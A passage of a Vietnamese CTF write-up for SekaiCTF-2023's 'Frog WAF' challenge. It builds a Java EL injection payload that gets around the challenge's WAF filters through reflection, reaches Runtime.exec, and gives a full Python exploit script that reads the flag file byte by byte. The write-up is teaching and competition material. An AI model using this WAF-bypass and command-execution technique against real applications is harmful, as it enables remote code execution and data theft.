+<p>Nhờ đó mình hoàn thiện được thêm function sau:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">get_character</span>(c):
+</span></span><span style="display:flex;"><span>	<span style="color:#75715e"># Lấy class Character: String.charAt().invoke(message,0) index 22 -&gt; method String#charAt không phải static -&gt; invoke obj message thay vì null</span>
+</span></span><span style="display:flex;"><span>	<span style="color:#75715e"># Character#toChars()[0].toString() index 39 -&gt; [0] do toChars trả về một array char, toString để dễ sử dụng method String#concat() các characters phía sau</span>
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">return</span> <span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;message.getClass().getMethods()[</span><span style="color:#e6db74">{</span>get_number(<span style="color:#ae81ff">22</span>)<span style="color:#e6db74">}</span><span style="color:#e6db74">].invoke(message,</span><span style="color:#e6db74">{</span>get_number(<span style="color:#ae81ff">0</span>)<span style="color:#e6db74">}</span><span style="color:#e6db74">).getClass().getMethods()[</span><span style="color:#e6db74">{</span>get_number(<span style="color:#ae81ff">39</span>)<span style="color:#e6db74">}</span><span style="color:#e6db74">].invoke(null,</span><span style="color:#e6db74">{</span>get_number(ord(c))<span style="color:#e6db74">}</span><span style="color:#e6db74">)[</span><span style="color:#e6db74">{</span>get_number(<span style="color:#ae81ff">0</span>)<span style="color:#e6db74">}</span><span style="color:#e6db74">].toString()&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">get_string</span>(chars):
+</span></span><span style="display:flex;"><span>	out <span style="color:#f92672">=</span> get_character(chars[<span style="color:#ae81ff">0</span>])
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">1</span>, len(chars)):
+</span></span><span style="display:flex;"><span>		out <span style="color:#f92672">+=</span> <span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;.concat(</span><span style="color:#e6db74">{</span>get_character(chars[i])<span style="color:#e6db74">}</span><span style="color:#e6db74">)&#34;</span>
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">return</span> out
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">get_class</span>(class_name):
+</span></span><span style="display:flex;"><span>	<span style="color:#75715e"># forName: 2 -&gt; Class#forName()</span>
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">return</span> <span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;message.getClass().getClass().getMethods()[</span><span style="color:#e6db74">{</span>get_number(<span style="color:#ae81ff">2</span>)<span style="color:#e6db74">}</span><span style="color:#e6db74">].invoke(message, </span><span style="color:#e6db74">{</span>get_string(class_name)<span style="color:#e6db74">}</span><span style="color:#e6db74">)&#34;</span>
+</span></span></code></pre></div><p>Demo <code>get_class('java.lang.Runtime')</code>:
+<img src="/images/2023/SekaiCTF-2023_Frog-WAF/demo2.png" alt="demo2"></p>
+<h3 id="finishing">Finishing</h3>
+<p>Đến đây thì không còn gì khó khăn nữa rồi, tương tự như trên mình hoàn thành nốt function <code>get_method</code> và <code>exec_method</code> để gọi đến <code>Runtime.getRuntime.exec(String)</code>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">get_method</span>(class_name, method_index):
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">return</span> get_class(class_name) <span style="color:#f92672">+</span> <span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;.getMethods()[</span><span style="color:#e6db74">{</span>get_number(method_index)<span style="color:#e6db74">}</span><span style="color:#e6db74">]&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">exec_method</span>(command):
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># Runtime#exec() index 6</span>
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">return</span> get_method(<span style="color:#e6db74">&#39;java.lang.Runtime&#39;</span>, <span style="color:#ae81ff">6</span>) <span style="color:#f92672">+</span> <span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;.invoke(null).exec(</span><span style="color:#e6db74">{</span>get_string(command)<span style="color:#e6db74">}</span><span style="color:#e6db74">).getInputStream().read()&#34;</span>
+</span></span></code></pre></div><p>Thực thi command thành công:
+<img src="/images/2023/SekaiCTF-2023_Frog-WAF/rce1.png" alt="rce1"></p>
+<p>Tuy nhiên như challenge đã hint là server sẽ không có outbound ==&gt; không thể lấy reverse shell cũng như <code>InputStream#read()</code> chỉ đọc 1 byte của stream và trả về:
+<img src="/images/2023/SekaiCTF-2023_Frog-WAF/InputStream_docs.png" alt="InputStream_docs"></p>
+<p>Vậy nên để lấy được flag mình sẽ chạy chạy command <code>bash -c {cat,/flag-*}|{cut,-c,{i}}</code> trong vòng lặp để lấy từng ký tự của flag:</p>
+<p>Full script:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">import</span> requests
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>url <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;http://frog-waf.chals.sekai.team/addContact&#39;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">adding_number_by_one</span>(s):
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">return</span> <span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;message.length().sum(message.equals(message).compareTo(message.equals(groups)),</span><span style="color:#e6db74">{</span>s<span style="color:#e6db74">}</span><span style="color:#e6db74">)&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">get_number</span>(n):
+</span></span><span style="display:flex;"><span>	zero <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;message.equals(message).compareTo(message.equals(message))&#34;</span>
+</span></span><span style="display:flex;"><span>	one <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;message.equals(message).compareTo(message.equals(groups))&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> n <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>:
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">return</span> zero
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">elif</span> n <span style="color:#f92672">==</span> <span style="color:#ae81ff">1</span>:
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">return</span> one
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">else</span>:
+</span></span><span style="display:flex;"><span>		current_number <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>
+</span></span><span style="display:flex;"><span>		template_number <span style="color:#f92672">=</span> one
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">2</span>,<span style="color:#ae81ff">255</span>):
+</span></span><span style="display:flex;"><span>			template_number <span style="color:#f92672">=</span> adding_number_by_one(template_number)
+</span></span><span style="display:flex;"><span>			current_number <span style="color:#f92672">+=</span> <span style="color:#ae81ff">1</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">if</span> current_number <span style="color:#f92672">==</span> n:
+</span></span><span style="display:flex;"><span>				<span style="color:#66d9ef">return</span> template_number
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">get_character</span>(c):
+</span></span><span style="display:flex;"><span>	<span style="color:#75715e"># Lấy class Character: String.charAt().invoke(message,0) index 22 -&gt; method String#charAt không phải static -&gt; invoke obj message thay vì null</span>
+</span></span><span style="display:flex;"><span>	<span style="color:#75715e"># Character#toChars()[0].toString() index 39 -&gt; [0] do toChars trả về một array char, toString để dễ sử dụng method String#concat() các characters phía sau</span>
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">return</span> <span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;message.getClass().getMethods()[</span><span style="color:#e6db74">{</span>get_number(<span style="color:#ae81ff">22</span>)<span style="color:#e6db74">}</span><span style="color:#e6db74">].invoke(message,</span><span style="color:#e6db74">{</span>get_number(<span style="color:#ae81ff">0</span>)<span style="color:#e6db74">}</span><span style="color:#e6db74">).getClass().getMethods()[</span><span style="color:#e6db74">{</span>get_number(<span style="color:#ae81ff">39</span>)<span style="color:#e6db74">}</span><span style="color:#e6db74">].invoke(null,</span><span style="color:#e6db74">{</span>get_number(ord(c))<span style="color:#e6db74">}</span><span style="color:#e6db74">)[</span><span style="color:#e6db74">{</span>get_number(<span style="color:#ae81ff">0</span>)<span style="color:#e6db74">}</span><span style="color:#e6db74">].toString()&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">get_string</span>(chars):
+</span></span><span style="display:flex;"><span>	out <span style="color:#f92672">=</span> get_character(chars[<span style="color:#ae81ff">0</span>])
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">1</span>, len(chars)):
+</span></span><span style="display:flex;"><span>		out <span style="color:#f92672">+=</span> <span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;.concat(</span><span style="color:#e6db74">{</span>get_character(chars[i])<span style="color:#e6db74">}</span><span style="color:#e6db74">)&#34;</span>
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">return</span> out
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">get_class</span>(class_name):
+</span></span><span style="display:flex;"><span>	<span style="color:#75715e"># Class#forName() index 2</span>
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">return</span> <span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;message.getClass().getClass().getMethods()[</span><span style="color:#e6db74">{</span>get_number(<span style="color:#ae81ff">2</span>)<span style="color:#e6db74">}</span><span style="color:#e6db74">].invoke(message, </span><span style="color:#e6db74">{</span>get_string(class_name)<span style="color:#e6db74">}</span><span style="color:#e6db74">)&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">get_method</span>(class_name, method_index):
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">return</span> get_class(class_name) <span style="color:#f92672">+</span> <span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;.getMethods()[</span><span style="color:#e6db74">{</span>get_number(method_index)<span style="color:#e6db74">}</span><span style="color:#e6db74">]&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">exec_method</span>(command):
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># Runtime#exec() index 6</span>
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">return</span> get_method(<span style="color:#e6db74">&#39;java.lang.Runtime&#39;</span>, <span style="color:#ae81ff">6</span>) <span style="color:#f92672">+</span> <span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;.invoke(null).exec(</span><span style="color:#e6db74">{</span>get_string(command)<span style="color:#e6db74">}</span><span style="color:#e6db74">).getInputStream().read()&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> __name__ <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;__main__&#39;</span>:
+</span></span><span style="display:flex;"><span>	flag <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&#39;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">40</span>):
+</span></span><span style="display:flex;"><span>		cmd <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;bash -c {cat,/flag-*}|{cut,-c,&#39;</span> <span style="color:#f92672">+</span> str(i) <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;}&#39;</span>
+</span></span><span style="display:flex;"><span>		payload <span style="color:#f92672">=</span> exec_method(cmd)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>		json <span style="color:#f92672">=</span> {<span style="color:#e6db74">&#34;firstName&#34;</span>:<span style="color:#e6db74">&#34;Aaa&#34;</span>,
+</span></span><span style="display:flex;"><span>			<span style="color:#e6db74">&#34;lastName&#34;</span>:<span style="color:#e6db74">&#34;Aaa&#34;</span>,
+</span></span><span style="display:flex;"><span>			<span style="color:#e6db74">&#34;description&#34;</span>:<span style="color:#e6db74">&#34;Aaa&#34;</span>,
+</span></span><span style="display:flex;"><span>			<span style="color:#e6db74">&#34;country&#34;</span>: <span style="color:#e6db74">&#34;__${&#34;</span> <span style="color:#f92672">+</span> payload <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;}__&#34;</span>
+</span></span><span style="display:flex;"><span>		}
+</span></span><span style="display:flex;"><span>		r <span style="color:#f92672">=</span> requests<span style="color:#f92672">.</span>post(url, json<span style="color:#f92672">=</span>json)
+</span></span><span style="display:flex;"><span>		msg <span style="color:#f92672">=</span> r<span style="color:#f92672">.</span>json()[<span style="color:#e6db74">&#34;violations&#34;</span>][<span style="color:#ae81ff">0</span>][<span style="color:#e6db74">&#34;message&#34;</span>]<span style="color:#f92672">.</span>split(<span style="color:#e6db74">&#39;__&#39;</span>)[<span style="color:#ae81ff">1</span>]
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">if</span> int(msg) <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">20</span>:
+</span></span><span style="display:flex;"><span>			flag <span style="color:#f92672">+=</span> chr(int(msg))
+</span></span><span style="display:flex;"><span>			print(flag)
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">else</span>:
+</span></span><span style="display:flex;"><span>			exit()
+</span></span></code></pre></div><p><strong>flag</strong>: <code>SEKAI{0h_w0w_y0u_r34lly_b34t_fr0g_wAf_c0ngr4ts!!!!}</code></p>
+<h2 id="other-methods">Other methods</h2>
+<ul>
+<li>Write up của <a href="https://fireshellsecurity.team/sekaictf-frog-waf-and-chunky/#challenge-frog-waf-29-solves">fireshellsecurity</a> lấy number qua <code>Array.size()</code> đơn giản hơn nhiều:
+<img src="/images/2023/SekaiCTF-2023_Frog-WAF/fireshellsecurity_ref.png" alt="fireshellsecurity_ref"></li>
+</ul>
+<h2 id="tham-khảo-thêm">Tham khảo thêm</h2>
+<ul>
+<li>Basic SpEL Injection: <a href="http://rui0.cn/archives/1043">http://rui0.cn/archives/1043</a></li>
+<li>EL injection WAF bypass study case: <a href="https://pulsesecurity.co.nz/articles/EL-Injection-WAF-Bypass">https://pulsesecurity.co.nz/articles/EL-Injection-WAF-Bypass</a></li>
+<li>Bean Validation RCE: <a href="https://securitylab.github.com/research/bean-validation-RCE/">https://securitylab.github.com/research/bean-validation-RCE/</a></li>
+<li>zeyu2001 script solution: <a href="https://gist.github.com/zeyu2001/1b9e9634f6ec6cd3dcb588180c79bf00">https://gist.github.com/zeyu2001/1b9e9634f6ec6cd3dcb588180c79bf00</a></li>
+</ul>
+
+    </div>
+  </article>
+
+  
+  
+
+
+
+
+
+
+  <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/posts">Archives</a></li>
+         
+          <li><a href="/tags">Tags</a></li>
+         
+          <li><a href="/about">About</a></li>
+        
+      </ul>
+    </div>
+
+    
+    <div id="toc-footer" style="display: none">
+      <nav id="TableOfContents">
+  <ul>
+    <li><a href="#preface">Preface</a></li>
+    <li><a href="#overview">Overview</a></li>
+    <li><a href="#build-payload">Build payload</a>
+      <ul>
+        <li><a href="#bypass-number-restriction">Bypass number restriction</a></li>
+        <li><a href="#bypass-string-restriction">Bypass string restriction</a></li>
+        <li><a href="#finishing">Finishing</a></li>
+      </ul>
+    </li>
+    <li><a href="#other-methods">Other methods</a></li>
+    <li><a href="#tham-khảo-thêm">Tham khảo thêm</a></li>
+  </ul>
+</nav>
+    </div>
+    
+
+    <div id="share-footer" style="display: none">
+      
+      <ul>
+  
+  
+    
+  
+  
+  <li>
+    <a class="icon" href="http://www.facebook.com/sharer.php?u=https%3a%2f%2fdevme4f.github.io%2fposts%2f2023%2fsekaictf-2023_frog-waf%2f" aria-label="Facebook">
+      <i class="fab fa-facebook fa-lg" aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="https://twitter.com/share?url=https%3a%2f%2fdevme4f.github.io%2fposts%2f2023%2fsekaictf-2023_frog-waf%2f&text=SekaiCTF-2023%20Ctf%20Writeup%20-%20Frog%20WAF%20-%20EL%20Injection%20WAF%20Bypass" aria-label="Twitter">
+      <i class="fab fa-twitter fa-lg" aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="http://www.linkedin.com/shareArticle?url=https%3a%2f%2fdevme4f.github.io%2fposts%2f2023%2fsekaictf-2023_frog-waf%2f&title=SekaiCTF-2023%20Ctf%20Writeup%20-%20Frog%20WAF%20-%20EL%20Injection%20WAF%20Bypass" aria-label="Linkedin">
+      <i class="fab fa-linkedin fa-lg" aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=https%3a%2f%2fdevme4f.github.io%2fposts%2f2023%2fsekaictf-2023_frog-waf%2f&is_video=false&description=SekaiCTF-2023%20Ctf%20Writeup%20-%20Frog%20WAF%20-%20EL%20Injection%20WAF%20Bypass" aria-label="Pinterest">
+      <i class="fab fa-pinterest fa-lg" aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="mailto:?subject=SekaiCTF-2023%20Ctf%20Writeup%20-%20Frog%20WAF%20-%20EL%20Injection%20WAF%20Bypass&body=Check out this article: https%3a%2f%2fdevme4f.github.io%2fposts%2f2023%2fsekaictf-2023_frog-waf%2f" aria-label="Email">
+      <i class="fas fa-envelope fa-lg" aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="https://getpocket.com/save?url=https%3a%2f%2fdevme4f.github.io%2fposts%2f2023%2fsekaictf-2023_frog-waf%2f&title=SekaiCTF-2023%20Ctf%20Writeup%20-%20Frog%20WAF%20-%20EL%20Injection%20WAF%20Bypass" aria-label="Pocket">
+      <i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="http://reddit.com/submit?url=https%3a%2f%2fdevme4f.github.io%2fposts%2f2023%2fsekaictf-2023_frog-waf%2f&title=SekaiCTF-2023%20Ctf%20Writeup%20-%20Frog%20WAF%20-%20EL%20Injection%20WAF%20Bypass" aria-label="reddit">
+      <i class="fab fa-reddit fa-lg" aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="http://www.tumblr.com/share/link?url=https%3a%2f%2fdevme4f.github.io%2fposts%2f2023%2fsekaictf-2023_frog-waf%2f&name=SekaiCTF-2023%20Ctf%20Writeup%20-%20Frog%20WAF%20-%20EL%20Injection%20WAF%20Bypass&description=Preface%20Write%20up%20chi%20ti%e1%ba%bft%20b%c3%a0i%20Frog-WAF%20thu%e1%bb%99c%20gi%e1%ba%a3i%20SekaiCTF-2023.%20B%c3%a0i%20n%c3%a0y%20trong%20gi%e1%ba%a3i%20m%c3%acnh%20kh%c3%b4ng%20l%c3%a0m%20ra%20do%20stuck%201%20s%e1%bb%91%20ch%e1%bb%97%20n%c3%aan%20h%c3%b4m%20nay%20m%c3%acnh%20s%e1%ba%bd%20tham%20kh%e1%ba%a3o%20qua%20script%20solution%20v%c3%a0%20write%20up%20chi%20ti%e1%ba%bft%20l%e1%ba%a1i.%0aOverview%20Challenge%20cho%20source-code%2c%20c%c3%a1c%20b%e1%ba%a1n%20c%c3%b3%20th%e1%bb%83%20t%e1%ba%a3i%20t%e1%ba%a1i%3a%20https%3a%2f%2fdrive.google.com%2ffile%2fd%2f1NDolpwf01ckCy7qcBGEp-_aZGT0OfI6E%2fview%3fusp%3dsharing%0aChallenge%20d%c3%b9ng%20gradle%20%c4%91%e1%bb%83%20build%20app%20spring%20boot%20Xem%20Dockerfile%3a%0aFROM%20gradle%3a7.5-jdk11-alpine%20AS%20build%20COPY%20--chown%3dgradle%3agradle%20build.gradle%20settings.gradle%20%2fhome%2fgradle%2ffrogwaf%2f%20COPY%20--chown%3dgradle%3agradle%20src%2f%20%2fhome%2fgradle%2ffrogwaf%2fsrc%2f%20WORKDIR%20%2fhome%2fgradle%2ffrogwaf%20RUN%20gradle%20bootJar%20FROM%20openjdk%3a11-slim%20COPY%20flag." aria-label="Tumblr">
+      <i class="fab fa-tumblr fa-lg" aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="https://news.ycombinator.com/submitlink?u=https%3a%2f%2fdevme4f.github.io%2fposts%2f2023%2fsekaictf-2023_frog-waf%2f&t=SekaiCTF-2023%20Ctf%20Writeup%20-%20Frog%20WAF%20-%20EL%20Injection%20WAF%20Bypass" aria-label="Hacker News">
+      <i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i>
+    </a>
+  </li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+      
+        <a id="menu-toggle" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;" aria-label="Menu">
+          <i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        
+        <a id="toc-toggle" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;" aria-label="TOC">
+          <i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        
+        <a id="share-toggle" class="icon" href="#" onclick="$('#share-footer').toggle();return false;" aria-label="Share">
+          <i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" aria-label="Top of Page">
+          <i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+
+  <footer id="footer">
+  <div class="footer-left">
+    Copyright  &copy; 2024  devme4f blogs 
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+         
+        <li><a href="/">Home</a></li>
+         
+        <li><a href="/posts">Archives</a></li>
+         
+        <li><a href="/tags">Tags</a></li>
+         
+        <li><a href="/about">About</a></li>
+        
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+
+  </div>
+</body>
+
+<link rel="stylesheet" href=/lib/font-awesome/css/all.min.css>
+<script src=/lib/jquery/jquery.min.js></script>
+<script src=/js/main.js></script>
+
+<script src=/js/code-copy.js></script>
+
+
+
+
+</html>
